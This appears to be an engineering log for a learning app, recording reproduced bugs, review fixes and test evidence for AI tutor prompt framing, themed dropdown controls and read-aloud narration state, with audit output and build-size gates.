- Startup script: 715,643 bytes (budget 750,000; the same as main). Route
  screens beyond the entry: 891,828 bytes (budget 900,000; main 890,629).
- Gate on the final code: `npm run check` passed (`audit:ai` 542/542,
  `audit:ai-eval` passed with no fixture change). `npm run check:browser`
  passed all 13 suites on the first attempt with no retries. In an earlier
  gate run, before the offer fix, `workflow` passed only on its retry. Its
  first attempt timed out waiting for the Reader after a Library search, a
  path this branch does not touch. Two standalone reruns with retries off
  both passed.

## Review follow-up on 2026-09-25: tutor session framing (#82)

An adversarial review re-ran the tutor through the real client
(`requestAiStream`, `fitTutorRequest`, `tutorConversationWindow` and the
tutor's action builders) against this worktree's own integrated server
(`startApplicationServer` with the `.env` values, loopback overrides and
`AI_AUTH=open`) and `qwen3.5:4b`. Unlike the probes above, each session was
chained: the model's own replies became the history of the next turn, as in
the app. "Before" is the branch as submitted (73aa5da); "after" is the
review fix. 73 generations in all.

| Scenario | Before (73aa5da) | After |
| --- | --- | --- |
| "Give me a hint." typed after the tutor's question | Framed `answer`: "Your answer is **partly correct**: while the continuous nature of the L2 penalty prevents exact zeros…" (10.4 s) | Framed `hint`, 2 of 2: one cited hint and a nudge to try again, no assessment (11.3–11.9 s) |
| Notebook mistake with "Hi, can you help with this one?" typed above it | Framed `answer`, from the bridge's own `My answer:` line: "Your answer is a misconception because Ridge regression (L2) shrinks coefficients continuously…" (89 tokens, 9.8 s) | Framed `diagnose`, 2 of 2: one diagnostic question only, e.g. "When you said ridge regression sets coefficients to exactly zero, what part of your reasoning led you to that conclusion? [S1]" (27–36 tokens, 7.1–7.7 s) |
| "Next question, please." typed mid-session | Framed `answer` (not run live) | Framed `open`: one cited question, no praise (12.4 s) |
| Assessed Socratic turn that ends with a task, not a question | 3 of 20 assessed turns across all runs ended with a task such as "…consider how the choice of λ balances…", so the learner's reply to it was framed `open` and not assessed | Counted as asking. Even with the new "make that question the end of your reply" instruction, 1 of 4 assessed turns in the final chain ended "Consider why the geometric shape…"; the reply after it is now framed `answer` |
| Session in order: start, answer, Hint, answer after the hint, reveal, Next question, answer, Wrap up | Each framed as expected | Each framed as expected; every Socratic turn cited only supplied labels |
| Grounded Explain | `validating` before the answer's text | Same: `start > approach > preparing > generating > validating > delta > complete`, labels [S1, S2, S3, S5] all supplied (8.3 s) |
| Quiz (structured) | Validated, citations resolved | Same: `generating > validating > complete`, every label supplied (22.8 s) |

Found and fixed:

- A learner who types a hint request ("Give me a hint.", "Can I get
  another hint?", "hint please") after a question was assessed as if the
  request were an answer, the same symptom as the Hint action before #82.
  Short typed hint requests are now framed `hint`, and the reply after one
  is an answer. A short "Next question, please." or "Skip this one" is
  framed `open`. Both are matched only in the learner's own first paragraph
  (the client appends its grounding sentence as a paragraph of its own) and
  only up to 120 characters, so a longer answer that mentions a hint is
  still assessed.
- The notebook bridge is placed in the question box for the learner to
  review. Anything written above it hid the `Work through this mistake`
  opening, and its own `My answer:` line then made the request an answer to
  assess and correct. The bridge is now also recognized by its `Question:`
  and `Expected answer:` lines.
- The live model ended some assessed turns with a task ("To deepen your
  intuition…, consider how the geometry changes…") instead of a question,
  in 3 of 20 assessed turns across the reviewer's and the implementer's
  runs. The reply to such a turn was framed `open`, so a real answer was
  not assessed. A closing "consider / think about / try to / explain why /
  predict" task now counts as asking, as do `? [S1].` and a full-width
  `？`. The answer and open formats also ask the model to make the question
  the end of the reply.
- The Socratic start, lesson starter and Check my understanding prompts in
  their earlier wording (a stale app shell or a restored draft) said nothing
  about an answer, so after an explanation ending with a real question they
  were framed `answer`. Their opening words are now framed `open`.
- The `open` instruction said the learner "has not answered a question of
  yours in this line of questioning", which is false for Next question
  mid-session. It now says the latest message is not an answer and asks for
  no comment on earlier answers.

Remaining model limit: after a reveal in a long session, Next question
still opened by crediting the learner's earlier answers ("You correctly
identified that Lasso…") in about 1 of 4 runs with either wording (old 1 of
4, new 1 of 4; a third wording that told the model how to begin did no
better, 2 of 6, and was dropped). The framing is `open` in every run.
Session starts (0 of 8) and Check my understanding (0 of 8) were not
praised.

Evidence:

- `server/ai/quality.test.mjs` adds 16 framing cases through the client's
  own window: the prefixed and reworded bridge, typed hint and move-on
  requests with and without a prior question, an answer that mentions a
  hint, an answer that opens with "Next", the earlier start and check
  wording after a real question, a closing "consider how" task, a period
  after the label, a full-width question mark, and an explanation that ends
  with a suggestion (still `open`). It also pins the new open wording and
  the end-with-the-question instruction. Mutations: dropping the bridge's
  field match, the typed hint or move-on match, the earlier wording, the
  period or full-width handling, the closing-task rule (or its lead clause,
  or matching it anywhere), or the end-with-the-question instruction each
  fail 2 tests; restoring the old open wording fails 1.
- Probe scripts and raw results: `chain_probe.mjs` and `open_probe.mjs`
  with `chain-head.json`, `chain-fixed.json`, `chain-final.json` and
  `open-wording{A,B,C}.json` in the reviewer's scratch directory.
- Gate on the review fix: `npm run check` passed (`audit:ai` 542/542,
  `audit:ai-eval` 27 cases, hit@1 0.913, no fixture change). Startup entry
  715,643 bytes and route screens 891,828 bytes, unchanged by this
  server-only fix. `npm run check:browser` passed all 13 suites on the first
  attempt.

## Bugs reproduced on 2026-09-28: default dropdowns (#92)

Every dropdown was a browser-drawn `<select>` with its own per-screen skin.
Against main (e2f7997), served the way `check:browser` serves a build:

- At 393px touch, 12 of the 25 selects rendered under 16px, so iOS zooms on
  focus: the Listen sheet's Language and Voice at 11.04px, the highlight
  dialog's Purpose at 11.36px, the Teaching section picker at 11.2px, the
  Organize dialog's Collection, the whiteboard page and both On-device
  composer selects at 11.84px, Library Sort at 11.52px, the Mac tutor's Depth
  at 12.8px, the tutor history setting at 13.12px and the practice Track at
  13.76px. 17 were under 44px (the batch Collection 34px, the Teaching picker
  36px, the Daily limits and interview strips 38px).
- At 1280px the selects had nine heights (34–44px), four radii and
  10.24–13.76px text. None set `appearance: none`, nine rules reserved room
  for a chevron that was never drawn, and the Teaching picker hard-coded
  white on navy under a light `color-scheme`.
- On-device Answer length read "Standard · 640 t", and Library Sort listed
  "Curriculum order" twice when there was no query.

All 25 now use one control, `.ui-select` with `--sm` and `--block`, on the
unchanged native element, so every audit's `page.select()` still works. It
has `appearance: none`, a chevron drawn by two gradient strokes in
`--select-icon`, a `--control-border` edge that reaches 3:1 on every paper
surface, 44px and 16px text at 740px and below or on a coarse pointer, 40px
and 14px on a desktop (34px and 13px compact), hover, the global focus ring,
a dashed `--paper-3` disabled look, an invalid state, and the system control
in forced colours. The Teaching island sets its own select tokens,
`color-scheme: dark` and the navy islands' gold focus ring (the default blue
ring measured 1.9:1 on the picker's navy). With a mouse in Chrome and Edge
135+ or Safari 27, the customizable select (`appearance: base-select`) opens
a themed picker; phones keep the native picker. Per-screen skins and the unused `.select` rules are
gone. The verified plan's two traps are closed: `select` left `ai-tutor.css`'s
`:is(.ai-tutor, .ai-tutor-sheet) … { font: inherit }` rule, which outranks the
class and held the Mac tutor's Mode at 13.12px and Depth at 12.8px, and the
picker's entry animation is written as `.ui-select:open::picker(select)`,
which the production Lightning CSS minifier accepts.

Found while building it:

- The customizable select sizes to its value and never ellipsizes it, so a
  long value in a narrow field ran over the chevron (the Listen sheet's
  Language at 1280px). There the chevron moves to the picker icon, laid over
  the end padding, and an overlong value fades out under it. That select also
  sizes to its current value, so on a desktop an auto-width select changes
  width when its value changes; this is how the customizable select works
  (`field-sizing` does not change it). This was left as is here and fixed in
  the review follow-up below.
- Its picker is part of the page, so Escape in the open picker also reached
  the dialog and sheet handlers on `window` and closed the Listen sheet with
  it. A capture-phase listener in `src/main.jsx` leaves that Escape to the
  picker.
- At 16px, "Standard (640)" still clipped by 4px in the On-device composer's
  half-width column. Depth and Answer length now share the row only when both
  fit. "Session only (do not save)" became "Session only" (the setting's text
  already says it stops saving), and network voices read "Network" (the
  sheet's microcopy explains it).

How it is checked:

- `scripts/select_contract.mjs` measures every visible select: the shared
  class, `appearance` none or base-select, the two-stroke chevron in
  `--select-icon`, text, fill and edge on the theme tokens (or the dashed
  `--paper-3` disabled look), and either 44px with 16px text on a phone or
  one height, radius and text size per variant on a desktop (40px, 12px,
  14px; compact 34px, 10px, 13px).
- `audit:controls` seeds a profile so every select renders and measures 12
  screens and dialogs (Library, Listen, the highlight dialog, Teaching,
  Whiteboard, Notebook highlights and batch toolbar, Organize, the Review
  strips and mistake filter, New card, Log mistake, Settings, On-device Lite)
  in Paper, Night and Contrast at 393px touch and 1280px. Against main it
  reports all 22 phone and 21 desktop selects, for example `selects/phone/
  reader listen: select “Narration language”: not the shared .ui-select
  control; browser-drawn (appearance auto); no themed chevron in
  --select-icon; colours off the theme tokens (text --select-ink, fill
  --select-bg, edge --control-border); 41px tall (needs 44px on a phone);
  11.04px text, so iOS zooms on focus (needs 16px) [paper, dark, contrast]`.
  The same measurement fails a select that lists a label twice (Library
  Sort's "Curriculum order" against main; the Listen sheet's lists come from
  the device's voices and are exempt) and, on the phone, an On-device
  composer select whose value does not fit. With a mouse it also opens the
  Language picker and presses Escape; that check fails against a build
  without the guard ("Escape in the select picker also closed the Listen
  sheet").
- `audit:ai-ui` holds the Mac tutor's Mode select, the Options sheet's Depth
  and the practice Track to the phone contract. It fails against main and
  against this change with `select` put back in the font rule ("select
  “Depth”: 12.8px text, so iOS zooms on focus").
- `themeContrast.test.mjs` keeps `--control-border` and `--select-icon` at
  3:1 on every paper surface in all four palettes, the select text and
  checked-option pairs at 4.5:1, and the Teaching island's select tokens
  readable on its navy.

Not covered: headless Chrome does not paint native pickers, so Safari 27's
picker on macOS and the native picker on an iPhone (no focus zoom) need a
manual pass on devices.

Gate: `npm run check` passed (`audit:ai` 547/547, `audit:ai-eval` 27 cases,
hit@1 0.913). The startup entry is 715,972 bytes (main 715,643) and the route
screens 891,667 bytes (main 891,828): the main stylesheet grew 2,701 bytes
minified (853 gzip) and the lazy tutor stylesheets shrank 993 bytes.
`npm run check:browser` passed all 13 suites on the first attempt, and
`controls` and `ai-ui` passed again alone with retries off after the
repeated-label check was scoped away from the device voice lists.

## Bugs reproduced on 2026-09-28: themed select review (#92)

A review of the themed select above found these on the branch build before
this fix (ba70d3e), served the way `check:browser` serves a build. Except for
the batch toolbar, each comes from the customizable select, which main never
used, so main passes those checks. The failures below come from the branch
build before the fix.

- Keys typed in an open picker reached the page. With a mouse the open
  picker focuses an `<option>`. The whiteboard, "?" shortcut and review
  session handlers only skipped an `HTMLSelectElement` target, so they did
  not treat the option as a form control. On the whiteboard with an object
  selected, ArrowDown in the page picker moved the object and saved it
  (points 0.400 → 0.410 and 0.400 → 0.420) and left the picker on page 1,
  and "e" switched to the Eraser. "?" in the open Library Sort picker opened
  the keyboard shortcuts over it. The handlers now skip any target inside a
  select (`target.closest("select")`). Escape keeps its capture guard.
- The picker ran off short windows. The author rules `position-try-order:
  normal` and `max-block-size: min(22rem, 60dvh)` replaced the UA's
  `most-block-size` and `stretch`. At 1280×560 the Interview track list
  opened downward, its last option sat at 593–633px, and the list could not
  scroll. The UA's placement is back and only the width is capped. At
  1366×650 the list now opens upward, and at 1280×560 it scrolls inside the
  window.
- The picker's entry transition ran with reduced motion (`0.12s, 0.12s`),
  because the global rule cannot match `::picker(select)`. It is now `none`
  there.
- At 1280px the Listen sheet's Language read "All languages (18", with the
  last digit fading into the chevron (131px needed, 113px of room). An
  overlong value stayed visible 2px from the arrow: the fade became solid
  24px from the edge, and the chevron starts 23px in. Language and Voice now
  share one column at every width. In the customizable select, the end
  padding and the picker icon are now 44px (42px compact). An overlong value
  is fully covered from 32px from the edge, 9px before the arrow, and a value
  that fits never fades.
- With a mouse a select took the width of its current value, so a pick moved
  the select and the controls beside it. Library Sort ranged 99–150px, the
  interview track 142–231px, the round 88–183px, Scheduler 87–145px, the
  mistake Category 58–135px, the highlights Purpose 58–110px and the Teaching
  picker 133–260px. These toolbar selects now have a fixed width (the
  Teaching picker, 260px) or a minimum width that fits every option.
- Phone layouts. At 320px the Teaching picker showed "1. Int…" (110px needed,
  54px of room); at 360px and below it now takes a row of its own. At 393px
  the Scheduler picker dropped under its label while Retention sat inline
  beside it. Each Daily limits label now keeps its label and select on one
  row: a picker that cannot share a row takes its own, and at large text its
  select shrinks (REV-22 still holds). At 360px with 200% text Library Sort
  ran 11px into the page gutter; its label may now shrink.
- Pre-existing on main: a long collection name pushed the batch toolbar's
  select 157px past a 393px toolbar (163px on main). The label is now capped,
  so the select ellipsizes and keeps its chevron.
- Also fixed: the Listen microcopy named "May use network", a label that no
  longer exists; it now says "Network". The mistake filter, the highlights
  Purpose and the Teaching picker now use the default 40px size, to match the
  40–42px buttons beside them. Empty or duplicate layout rules left over from
  the skins are gone. Hover now ranks below focus, invalid and open
  (`:where()`), so a hovered select with keyboard focus shows the focus edge.

How it is checked:

- `audit:controls`, desktop pass with a mouse (customizable select):
  - "?" in the open Library Sort picker must not open the shortcuts.
  - The picker must report no transition with reduced motion.
  - With a rectangle selected on a two-page board, ArrowDown in the open page
    picker must leave the saved board unchanged and move focus to page 2, and
    "e" must leave the tool as it was.
  - At 1280×560 the Interview track picker's last option (after End) must lie
    inside the window.
  - Each toolbar select (Library, Daily limits, interview strip, mistake
    filter, highlights, Teaching) is tried with every option and must keep
    one width.
  - A section title longer than the Teaching picker must leave at least 8
    clear pixels before the chevron. This is measured from a screenshot of
    the control's middle band.
  - The Listen sheet's default values must fit (a canvas measurement, the
    same one the On-device composer check uses).
- `audit:controls`, phone pass: the Teaching picker at 320px shows
  "1. Introduction" whole; the Daily limits pickers all sit the same way
  beside or under their labels; the batch toolbar does not overflow with a
  51-character collection selected.
- `audit:controls`, both passes: after choosing Quiz, the On-device Answer
  length is disabled and is measured in every theme. Before this, no check
  ever measured a disabled select. Against main it reports "no themed
  disabled look (opacity 0.7, solid edge)". The select measurement now moves
  the pointer away first: a pointer left over the highlight dialog's Purpose
  had marked it `:hover`, which skips its colour check.
- `audit:responsive`: on every surface and viewport, a select inside a page
  stays inside the page's content box.
- `audit:audio`: the microcopy must name “Network”, and a network voice must
  carry that label. The old assertion pinned “May use network”. It was
  changed on purpose, because the label was renamed.

Against the branch build before the fix, `audit:controls` fails with 20
findings, for example:

```
- selects/desktop/whiteboard: ArrowDown in the open page picker moved and saved the selected object
- selects/desktop/whiteboard: ArrowDown in the open page picker did not reach the next page (focused option 0)
- selects/desktop/whiteboard: “e” in the open page picker switched the tool from Select and move objects to Eraser
- selects/desktop/library: “?” in the open Sort picker opened the keyboard shortcuts
- selects/desktop/library: the select picker still animates (0.12s, 0.12s) with reduced motion
- selects/desktop/review: at 1280×560 the Interview track picker drew its last option off screen (OPTION “Computer Vision” at 593–633px of 560px)
- selects/desktop/reader listen: a Listen select clips its value: “All languages (180)” needs 131px of 113px
- selects/desktop/teaching mode: an overlong value shows 2px from the chevron (needs 8px clear; chevron 13–22px from the end)
- selects/desktop/library: the width follows the value, so a pick moves the toolbar: select “Sort library results” is 150px on “Curriculum order”, 148px on “Recently opened”, 133px on “Most progress”, 126px on “Shortest first”, 99px on “Title A–Z”
- selects/phone 320/teaching mode: the section picker clips its value: “1. Introduction” needs 110px of 54px
- selects/phone/review: the Daily limits pickers are laid out two ways: New beside its label, Reviews beside its label, Scheduler under its label, Retention beside its label
- selects/phone/notebook batch toolbar: a long collection name runs 157px past the toolbar
```

`audit:responsive` (phone-large-text) fails there with "Select crosses the
page gutter: Sort library results at 67–355px, page content 16–344px". Main
passes both of these new checks, except the batch toolbar ("runs 163px past
the toolbar").

Not changed:

- The select's `--control-border` edge is darker than the `--line-strong`
  edges of the text fields beside it in dialogs. That is deliberate (3:1),
  and §18 now records it. Moving every text field to the same edge is a
  change across the whole app, not part of #92.
- The Teaching Mode eyebrow's contrast on the navy island (about 3.1:1) is
  pre-existing and unrelated to selects.
- At 320px the Mac tutor's practice Track already spans its row, and the
  track names come from the shared interview-track data, so a long track name
  still ellipsizes. Main shows the same.

Gate: `npm run check` passed (`audit:ai` 547/547, `audit:ai-eval` 27 cases,
hit@1 0.913). The startup entry is 715,950 bytes and the route screens
891,561 bytes (main 715,643 and 891,828). Against main, the main stylesheet
grew 3,289 bytes minified (995 gzip) and the lazy tutor stylesheets shrank
1,095 bytes. `npm run check:browser` passed all 13 suites on the first
attempt, with no retries, in the fixer's run. An independent re-verifier's
full run with retries off, under heavy load (load average about 20), saw
`ai-ui` fail once on an assertion this change does not touch ("a stale
conversation did not end with the break divider", `ai_ui_audit.mjs:2701`);
run alone with `LUMEN_BROWSER_RETRIES=0` it passed.

## Bugs reproduced on 2026-09-28: themed select at large text and in narrow windows (#92)

A re-verification of the review follow-up above (72d5eba) found two
regressions it introduced, and select values that still shortened at 200%
text although they fitted on main. The failures below come from 72d5eba,
built into a scratch directory and served the way `check:browser` serves a
build; "main" is e2f7997.

- The Daily limits strip squeezed its Scheduler at large text. 72d5eba held
  each label and select on one row at 740px and below, so at 360px with 200%
  text the Scheduler read "Adaptiv…" (240px needed, 137px of room; 97px at
  320px, 207px at 430px). Main fitted it at 360px and 430px. Each Daily limits
  picker now has a row of its own, name at the start and select at the end; a
  select too wide for its row drops under its one-word name at full width.
  At 393px with default text all four still sit beside their names.
- With a mouse, a narrow window with large text scrolled sideways. The
  toolbar selects' rem minimum widths beat `max-inline-size: 100%`: Review
  scrolled 11px at 400px with 150% text, 137px at 400px with 200%, 91px at
  320px with 150% and 217px at 320px with 200%; Library 83px and the
  highlights Purpose 76px at 320px with 200%. The suggested
  `min-inline-size: min(width, 100%)` was tried and rejected: the percentage
  resolves against a label that is itself sized by the select, so at 1280px
  the widths followed the value again (Interview track 152–241px, Library Sort
  142–168px) and at 400px with 150% text Review still scrolled 14px. The widths
  are now `inline-size` in em of the select's own text, within a pixel of
  before at 1280px (Sort 169px, was 168px; Interview track 252px), and a
  width, unlike a minimum, shrinks with its row. The interview labels' grid
  column, the mistake filter label and the highlights heading can now shrink,
  Library Sort and the highlights Purpose drop under their names when the row
  is too narrow, and
  the mistake and highlights headings are single-line columns: as wrapping
  columns they stretched their controls to the widest control, past the page.
  In em the widths also hold every option at 16px in a narrow window, where
  the rem minimums cut "Rapid fundamentals" and "Misconception" at 600px.
- At 200% text a select's value was 32px (`max(16px, 1rem)`), against 22–26px
  skins on main. At 360px Library Sort read "Curriculum or…" (246px needed,
  235px of room) and the Listen language "All languages (1…" (283px, 262px),
  although both fitted on main. Select text on phones and touch screens is
  now `max(16px, 0.875rem)`: 16px at default size as before, so iOS still
  never zooms, and 28px at 200%, in proportion with the 0.82rem buttons
  beside it. At 360px with 200% text both values now fit.
- The Teaching picker shared its row with the timer and presenter buttons at
  393–430px with 200% text: at 430px "1. Introduction" needed 207px and had
  135px (main fitted it). The switch to a row of its own was a 360px media
  query; it is now a container query on the header actions at 23em, so it
  follows the text size. With default text it now also takes its own row at
  393–402px: beside the timer and buttons its value had about 7em of room, and
  at 393px 72d5eba fitted "1. Introduction" (110px) only by squashing the
  timer's clock icon to a few pixels. Without the squash it has 107px there.
  The cost is a header row: 105px to 151px tall at 393px.
- Found on the way, also on main: at 320px with 200% text the "Calibrate from
  my history" link ran 36px past the page (it now wraps at phone widths), and
  the notebook title ran 13px past the page in Linux Chrome (1px on macOS),
  because "notebook" at 2.35rem is wider than the page. The phone title is now
  `min(2.35rem, 21vw)`, which changes nothing at 360px and wider or at default
  text.
- Found on the way in the checks: in an emulated Linux Chrome, measuring a
  dialog's select two frames after a theme change read the previous theme's
  edge, because the reduced-motion colour transition had not finished. The
  theme measurement now waits for running transitions. 72d5eba shows the same
  failure there. And on Linux a viewport change drops Chrome's emulated mouse
  until the next load, so the fine-pointer pass reloads after each size.

Decided per select, at 360px with 200% text:

- Must fit, and now fit: Library Sort, the Listen language, every Daily limits
  picker, the Teaching picker ("1. Introduction"), the whiteboard page picker,
  the On-device Depth and Answer length, and the dialog selects.
- Allowed to shorten: the Listen voice ("Samantha · Default · On device" needs
  388px of 262px), whose full name, language and on-device status are
  repeated on the line below it; Settings "Up to 50 messages" (246px of 212px),
  which main showed only by running the select past the settings drawer's
  edge with its chevron off screen; and Card type and Interview track, which
  main cut as well. They keep their chevron and an ellipsis, and the picker
  lists every option in full. At 320px with 200% text the Listen language
  also shortens (249px of 222px); main fitted it there with 22px text.

How it is checked:

- `audit:responsive`, at every viewport (phone-large-text is 360px with 200%
  text): every option of each Daily limits select and of Library Sort, and the
  Listen language's value, must fit inside its select's padding (a canvas
  measurement in the select's font). The Daily limits and Sort selects are
  checked by their widest option, so a short current value cannot hide one a
  learner could pick.
- `audit:controls`, phone pass: the Teaching picker shows "1. Introduction"
  whole at 320px and 393px, and at 360px and 430px with 200% text.
- `audit:controls`, a narrow fine-pointer pass in its own browser with a mouse
  (`--blink-settings`, so headless Linux Chrome gets the customizable select
  too): Library, Review and the notebook at 400px and 320px with 150% and 200%
  text must not scroll sideways (2px tolerance) and must keep every select
  inside the page's content box. Where Chrome supports the customizable
  select, the pass also fails if the page did not use it, so it cannot pass
  by testing the touch path.

Against 72d5eba, `audit:responsive` (phone-large-text) fails with:

```
{"surface":"library-values","problems":["Select values cut short: Sort library results: “Curriculum order” needs 246px of 235px"]}
{"surface":"narration-values","problems":["Select values cut short: Narration language: “All languages (180)” needs 283px of 262px"]}
{"surface":"review-values","problems":["Select values cut short: Scheduling algorithm: “Adaptive (FSRS)” needs 240px of 137px"]}
```

and `audit:controls` with 17 findings, for example:

```
- selects/phone 430 at 200% text/teaching mode: the section picker clips its value: Jump to teaching section: “1. Introduction” needs 207px of 135px
- narrow fine pointer/review at 400px with 150% text: the page scrolls sideways by 11px (select “Interview track”)
- narrow fine pointer/library at 320px with 200% text: the page scrolls sideways by 83px (select “Sort library results”)
- narrow fine pointer/review at 320px with 200% text: the page scrolls sideways by 217px (div “CategoryAllMisconceptionFormulaC”, label “CategoryAllMisconceptionFormulaC”, select “Category”)
- narrow fine pointer/notebook at 320px with 200% text: the page scrolls sideways by 76px (div “PurposeAllImportantDefinitionsQu”, label “PurposeAllImportantDefinitionsQu”, select “Purpose”)
```

The new checks also pass on the committed build in Linux Chrome 154 (the
puppeteer Docker image, through a loopback proxy so the page is a secure
context): `audit:controls` in full, with the customizable select on all 12
narrow screens, and `audit:responsive` at small-phone, phone and
phone-large-text.

Gate: `npm run check` passed (`audit:ai` 547/547, `audit:ai-eval` 27 cases,
hit@1 0.913). The startup entry is 715,950 bytes and the route screens
891,561 bytes (budgets 750,000 and 900,000). Against main the main stylesheet
grew 3,491 bytes minified (1,071 gzip), 202 (76) more than 72d5eba, and the
lazy tutor stylesheets still shrink 1,095 bytes. `npm run check:browser`
passed all 13 suites on the first attempt with no retries (`responsive` 467
checks, `a11y` 57 axe runs with the empty allowlist), at a load average of
about 10–13 from other work on the machine. Only the docs and one CSS comment
changed after that run; the built stylesheet is byte-identical.

## Bugs reproduced on 2026-09-28: read-aloud state, queue and storage (#96)

Against main (57fb5cf), built into a scratch directory and served the way
`check:browser` serves a build, with `audit:audio`'s mocked iOS speech engine:

- The sleep timer turned Off when the playlist moved on to chapter 2.
  `openDocument` and the Reader's document effect both call `stop()`, which
  cleared it.
- A timer armed while idle counted from when it was armed. With the clock 11
  minutes on, Read closed the panel and spoke nothing, with no player.
- Section at "5. Learning paradigms" (an H2 followed by H3 5.1) read only the
  heading, 21 characters. At the top of chapter 1 it read only the title.
- Sentence read the paragraph's first sentence while its second sentence was
  on the reading line.
- A `QuotaExceededError` on narration writes replaced the Reader with "Lumen
  could not render this screen". With reads throwing too, Read threw and
  nothing played. `audioBookmarks.js` read `globalThis.localStorage` in a
  default parameter, outside its guard.
- Removing the chosen voice (Rishi) and firing `voiceschanged` rewrote
  `settings.voiceURI` to `samantha-en-us`, which a synced profile then carries
  to other devices.
- An audio bookmark did not play while the target was Sentence.
- A stored 9999 resumed at "Full lecture · 107/107". A saved index could not
  follow an edit either: a position saved from chunk 9 resumed at 1/107.
- With the Mermaid chunk blocked (offline), Full lecture read "The Mermaid
  module could not be loaded…" and then the raw `flowchart TD …` source.
  Online, the tab reloaded 144 times in 30 s, because the Reader chunk loading
  after each reload cleared the recovery marker that Mermaid's failure had
  set.
- With an engine that behaves like WebKit before 27, where `speak()` in the
  same task as a `cancel()` of live speech is dropped, Next spoke nothing.

The timer now survives `stop()`. Each Read starts a fresh countdown, and the
playlist's next chapter keeps the running deadline. Sections end at the next
heading at or above max(level, 2), and a heading with no body continues
through the next section. Sentence picks the sentence whose Range boxes cross
the reading line, and on a heading it reads the first sentence of the text
below. Resume positions and bookmarks are `{v: 2, index, total, snippet,
section}` records in `src/lib/narrationPositions.js` and `audioBookmarks.js`,
both of which resolve storage inside `try`. They relocate by snippet, then by
section, and resume never lands on the last chunk. A missing voice is never
written back. Bookmarks play the full lecture whatever the target is.
`.diagram-shell` content is not narrated. After a real cancel the next
utterance waits one task, while the first Read stays inside the tap. The
chunk-recovery marker clears only when the chunk it names loads, or when its
cooldown has passed.

How each is now checked:

- `audit:audio` runs 13 new cases, each in its own browser context, and
  reports all failures together. They cover the sleep timer across
  auto-advance (`Date.now` moved forward), a timer armed while idle
  (including resuming after the deadline), the section at an H2 and at the
  top of the chapter, and the sentence under the reading line, all at measured
  scroll positions. They also cover throwing writes and throwing reads, a
  removed voice with `voiceschanged`, a bookmark under the Sentence target, a
  stored 9999, snippet and section relocation, a Mermaid-blocked lecture, and
  a WebKit-before-27 mode of the mock. That mode also gains a `pending` flag
  and checks that the first Read speaks inside the tap. Against main:

  ```
  - sleep timer across auto-advance: the sleep timer read “Off” after the playlist advanced
  - sleep timer armed while idle: a sleep timer armed while idle swallowed the next Read (no player, no utterance)
  - section at an H2: the section at an H2 stopped before its H3 subsections (21 characters: “5. Learning paradigms”)
  - section at the top of a chapter: the top of the chapter read only “Chapter 1 — The AI/ML Mental Model”
  - sentence under the reading line: Sentence read “An intelligent product observes some context, produces an output or action, and is judged by its consequences.” with the second sentence on the reading line
  - storage writes that throw: a storage failure replaced the Reader with “Lumen could not render this screen”
  - storage reads and writes that throw: full-lecture narration did not start while storage throws
  - voice removed from the device: the missing voice was replaced in settings by samantha-en-us
  - bookmark with the Sentence target: a bookmark did not play with the Sentence target selected
  - a stored 9999: a stored 9999 resumed at Full lecture · 107/107
  - positions relocate after an edit: a snippet saved from chunk 9 resumed at Full lecture · 1/107
  - Mermaid unavailable: the diagram diagnostic was narrated
  - WebKit before 27: Next after a live cancel spoke nothing (the utterance was dropped)
  ```

- `audit:chunks` opens a fresh tab, blocks only the lecture's Mermaid chunk
  while online, and allows at most one reload before the diagram failure
  shows in the Reader. Against main: `a lecture whose Mermaid chunk is
  missing reloaded 144 times within the cooldown (Mermaid blocked 144
  times)`. The branch reloads once.
- Unit tests fail against main in 9 places: the section rule,
  `sentenceIndexAt`, the heading-to-next-sentence rule and the
  `.diagram-shell` exclusion in `speech.test.mjs`; the new
  `narrationPositions.test.mjs` (throwing storage and accessor, v1 to v2,
  snippet and section relocation, never the last chunk); a throwing accessor
  and the v2 fields in `audioBookmarks.test.mjs`; and in
  `chunkRecovery.test.mjs`, "after a failed load of chunk A, a successful
  load of chunk B keeps the marker" and the CSS/hyphenated-hash name match.

Found while building it: the first version left the status idle for the one
task an utterance waits after a real cancel. The tutor's Listen treats idle
as a finished reading, so `audit:ai-ui` failed twice at Listen after a
reading had ended (`Waiting for selector .ai-tutor__listen-stop failed`). The
status now reads "speaking" as soon as the utterance is scheduled, and
`ai-ui` passes when run alone with `LUMEN_BROWSER_RETRIES=0`.

The next-sentence behaviour after a real cancel on iOS before 27 (AM10) and
narration with iOS storage failing are device checks. They are listed in
[DEVICE_TESTING.md](DEVICE_TESTING.md) and are two new rows in the
`#/device-evidence` checklist.

Gate: `npm run check` passed (`audit:ai` 559/559, `audit:ai-eval` 27 cases,
hit@1 0.913). The startup entry is 716,643 bytes and the route screens
895,002 bytes (budgets 750,000 and 900,000; main is 715,950 and 891,561).
The final `npm run check:browser` passed all 13 suites at a load average of
about 10–12 from other work on the machine. `workflow` passed only on retry:
its first attempt timed out after 30 s waiting for `.reader-view` after
opening an uploaded lecture from the Library. Run alone with
`LUMEN_BROWSER_RETRIES=0`, it then passed twice in 46 s each, and it had
passed on the first attempt in the earlier full run.

## Review follow-up on 2026-09-28: read-aloud state (#96)

A review of the branch above found these problems, reproduced here against its
own build (5095726) with `audit:audio`'s mocked iOS engine:

- With the playlist on, a sleep deadline that passed during a chapter's last
  sentence still opened chapter 2 and announced "Continuing narration:
  Chapter 2 — Problem Framing and Objectives", then played nothing.
  `playIndex` handled the natural completion before its sleep check. The
  same false announcement followed when the deadline passed while chapter 2
  loaded. Main played chapter 2, because it lost the timer.
- Paused past the deadline, Next and Previous ended narration and turned the
  timer Off. Only Resume re-armed it. Main behaves the same.
- Browser Back during Full lecture saved chapter 1's position under
  chapter 2, because the route change renders the Reader with chapter 2 one
  commit before `stop()` lands. Main stored "4" there and resumed chapter 2
  at a sentence it never reached. The branch stored chapter 1's record and
  then said chapter 2 "changed since you stopped".
- After a pronunciation override for a word in the saved sentence, resume
  fell back to the section start (1/107 for a place at 6/107). The snippet is
  saved after overrides apply, so it no longer matched. Main resumed exactly.
- A position that fell back to its section still announced "Narration
  resumed from your last position."
- On main too, one long bookmark widened the narration sheet to 711 px of
  scroll in 375 px at 393 px, which put Delete at x 720. The grid's single
  column took the snippet's unwrapped width.
- On main too, a stored bookmark list holding `null` crashed the Reader.

The fixes:

- `playIndex` checks the sleep deadline before the natural completion. The
  Reader announces "Continuing narration" only once the next chapter's
  `speak()` returns true.
- A tap on a paused player (Resume, Next, Previous or a section skip) re-arms
  a lapsed deadline.
- The Reader writes positions and bookmarks only for the lecture whose queue
  it started.
- `locatePosition` keeps the saved index when the queue has the saved length
  and the same section there. The section fallback says "This lecture changed
  since you stopped, so narration resumes at the start of “…”."
- The bookmark list has one `minmax(0, 1fr)` column.
